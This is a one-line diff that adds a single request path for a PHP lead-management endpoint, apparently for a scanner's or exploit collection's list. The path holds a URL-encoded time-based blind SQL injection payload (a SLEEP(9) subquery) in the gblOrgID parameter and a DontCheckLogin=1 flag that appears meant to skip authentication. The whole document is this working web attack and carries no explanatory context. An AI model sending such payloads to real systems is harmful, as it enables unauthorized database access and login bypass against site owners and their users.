@@ -1,0 +1,1 @@
+/lead/newleadset.php?gblOrgID=1+AND+%28SELECT+5244+FROM+%28SELECT%28SLEEP%289%29%29%29HAjH%29--+-&DontCheckLogin=1
